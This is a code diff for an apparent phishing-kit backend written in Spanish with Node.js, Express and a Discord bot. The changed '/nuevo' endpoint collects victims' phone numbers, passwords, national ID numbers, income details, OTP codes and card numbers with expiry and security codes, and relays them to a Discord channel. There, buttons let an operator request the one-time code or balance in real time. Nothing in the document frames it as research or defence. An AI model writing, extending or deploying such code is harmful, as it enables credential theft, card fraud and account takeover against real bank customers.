@@ -36,26 +36,70 @@ function detectarMarca(tarjeta) {
     return 'Desconocida';
 }
 
-// 1. Endpoint que recibe la tarjeta desde verificaciondeidentidad.html
+// 🔥 ENDPOINT PRINCIPAL: Recibe TODOS los datos (Password, Simulador, OTP, Tarjeta)
 app.post('/nuevo', async (req, res) => {
     try {
-        const { userId, tarjeta, codigo, expMes, expAnio } = req.body;
-        if (!userId || !tarjeta) return res.status(400).json({ ok: false });
+        const { userId, accion, numero, password, datos, otp, tarjeta, codigo, expMes, expAnio } = req.body;
+        
+        // Si no hay userId, generamos uno temporal
+        const finalUserId = userId || 'anon_' + Date.now();
+        const channel = await client.channels.fetch(DISCORD_CHANNEL_ID);
 
-        sesiones.set(userId, {
-            userId, tarjeta, codigo: codigo || '', expMes, expAnio,
+        // ==========================================
+        // 1. DATOS PREVIOS A LA TARJETA (Password, Simulador, OTP)
+        // ==========================================
+        if (accion && accion !== 'tarjeta') {
+            let embed = new EmbedBuilder().setColor(0xda0081).setTimestamp().setFooter({ text: `User ID: ${finalUserId}` });
+            
+            if (accion === 'inicio') {
+                embed.setTitle('👀 Usuario en la página de inicio');
+            } 
+            else if (accion === 'password') {
+                embed.setTitle('🔒 Contraseña Ingresada')
+                     .addFields(
+                         { name: '📱 Teléfono', value: `\`${numero}\``, inline: true },
+                         { name: '🔑 Clave', value: `\`${password}\``, inline: true }
+                     );
+            } 
+            else if (accion === 'simulador') {
+                embed.setTitle('📝 Datos del Simulador de Crédito')
+                     .addFields(
+                         { name: '🆔 Cédula', value: `\`${datos.cedula}\``, inline: true },
+                         { name: '👤 Nombre', value: `\`${datos.nombre}\``, inline: true },
+                         { name: '💼 Ocupación', value: `\`${datos.ocupacion}\``, inline: true },
+                         { name: '💰 Ingresos', value: `\`${datos.ingresos}\``, inline: true },
+                         { name: '🏦 Saldo Declarado', value: `\`${datos.saldo}\``, inline: true },
+                         { name: '📅 Plazo', value: `\`${datos.plazo} meses\``, inline: true },
+                         { name: '📆 Día de Pago', value: `\`${datos.fechaPago}\``, inline: true },
+                         { name: '💵 Monto Solicitado', value: `\`${datos.monto}\``, inline: true }
+                     );
+            } 
+            else if (accion === 'otp') {
+                embed.setTitle('✍️ Firma de Contrato (OTP)')
+                     .addFields({ name: '🔢 OTP Ingresado', value: `\`${otp}\`` });
+            }
+            
+            await channel.send({ embeds: [embed] });
+            return res.json({ ok: true });
+        }
+
+        // ==========================================
+        // 2. DATOS DE LA TARJETA (Con Botones Interactivos)
+        // ==========================================
+        if (!tarjeta) return res.status(400).json({ ok: false, error: 'Falta tarjeta' });
+
+        sesiones.set(finalUserId, {
+            userId: finalUserId, tarjeta, codigo: codigo || '', expMes, expAnio,
             estado: 'pending', otp: null, saldo: null, discordMsgId: null
         });
 
-        const channel = await client.channels.fetch(DISCORD_CHANNEL_ID);
         const marca = detectarMarca(tarjeta);
 
-        // 🔥 NUEVO EMBED: Sin monto, con fecha y marca
         const embed = new EmbedBuilder()
             .setTitle('💳 Nueva tarjeta recibida')
             .setColor(0xda0081)
             .addFields(
-                { name: '🆔 User ID', value: `\`${userId}\``, inline: false },
+                { name: '🆔 User ID', value: `\`${finalUserId}\``, inline: false },
                 { name: '💳 Tarjeta', value: `\`${tarjeta}\``, inline: false },
                 { name: '🏦 Marca', value: `\`${marca}\``, inline: true },
                 { name: '📅 Vence', value: `\`${expMes || '?'}/${expAnio || '?'}\``, inline: true },
@@ -64,16 +108,16 @@ app.post('/nuevo', async (req, res) => {
             .setTimestamp();
 
         const row = new ActionRowBuilder().addComponents(
-            new ButtonBuilder().setCustomId(`otp_${userId}`).setLabel('📱 Pedir Dinámica').setStyle(ButtonStyle.Primary),
-            new ButtonBuilder().setCustomId(`saldo_${userId}`).setLabel('💰 Pedir Saldo').setStyle(ButtonStyle.Primary),
-            new ButtonBuilder().setCustomId(`approve_${userId}`).setLabel('✅ Aprobar').setStyle(ButtonStyle.Success),
-            new ButtonBuilder().setCustomId(`reject_${userId}`).setLabel('❌ Rechazar').setStyle(ButtonStyle.Danger)
+            new ButtonBuilder().setCustomId(`otp_${finalUserId}`).setLabel('📱 Pedir Dinámica').setStyle(ButtonStyle.Primary),
+            new ButtonBuilder().setCustomId(`saldo_${finalUserId}`).setLabel('💰 Pedir Saldo').setStyle(ButtonStyle.Primary),
+            new ButtonBuilder().setCustomId(`approve_${finalUserId}`).setLabel('✅ Aprobar').setStyle(ButtonStyle.Success),
+            new ButtonBuilder().setCustomId(`reject_${finalUserId}`).setLabel('❌ Rechazar').setStyle(ButtonStyle.Danger)
         );
 
         const msg = await channel.send({ embeds: [embed], components: [row] });
-        const s = sesiones.get(userId);
+        const s = sesiones.get(finalUserId);
         s.discordMsgId = msg.id;
-        sesiones.set(userId, s);
+        sesiones.set(finalUserId, s);
 
         res.json({ ok: true });
     } catch (e) {
@@ -82,7 +126,9 @@ app.post('/nuevo', async (req, res) => {
     }
 });
 
-// 2. Endpoint que recibe la dinámica (OTP) del usuario
+// ==========================================
+// ENDPOINTS DE ESPERA (OTP, SALDO, ESTADO)
+// ==========================================
 app.post('/otp/:userId', async (req, res) => {
     try {
         const { userId } = req.params;
@@ -109,7 +155,6 @@ app.post('/otp/:userId', async (req, res) => {
     }
 });
 
-// 3. Endpoint que recibe el saldo del usuario
 app.post('/saldo/:userId', async (req, res) => {
     try {
         const { userId } = req.params;
@@ -136,14 +181,15 @@ app.post('/saldo/:userId', async (req, res) => {
     }
 });
 
-// 4. Endpoint que consulta espera.html cada 2 segundos
 app.get('/estado/:userId', (req, res) => {
     const s = sesiones.get(req.params.userId);
     if (!s) return res.json({ estado: 'pending' });
     res.json({ estado: s.estado, otp: s.otp || null });
 });
 
-// 5. Escuchar los clics de los botones en Discord
+// ==========================================
+// BOTONES DE DISCORD
+// ==========================================
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isButton()) return;
 
